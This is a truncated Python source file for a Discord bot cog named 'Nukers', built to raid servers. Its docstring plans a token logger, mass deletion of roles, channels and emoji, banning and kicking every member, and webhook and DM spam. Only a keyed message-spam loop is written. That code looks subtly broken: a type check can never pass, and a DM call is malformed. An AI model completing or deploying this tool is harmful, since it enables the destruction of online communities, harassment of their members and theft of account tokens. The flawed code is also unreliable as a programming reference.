import discord
from discord.ext import commands
import asyncio

'''token logger
nuker spam
nuker role delete
nuker channel delete
nuker emoji delete
nuker create channels
nuker ban all
nuker kick all
nuker webhook spam
nuker dm all
nuker nickname all
change server avatar and name
'''
class Nukers(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.authorized_users = []
        self.valid_keys = []

    @commands.command()
    async def nuker(self, ctx, key: str | None = None, arg1: str | None = None, arg2: str | None = None):
        if ctx.author.id not in self.authorized_users:
            return
        if key not in self.valid_keys:
            ctx.author.dm('Valid keys: ')
            return
        
        if key == 'spam' and isinstance(arg1, int) and isinstance(arg2, str):
            i = 0
            while i < arg1:
                await ctx.send(arg2)
                await asyncio.sleep(.5)
                i += 1
            
            return

        if key ==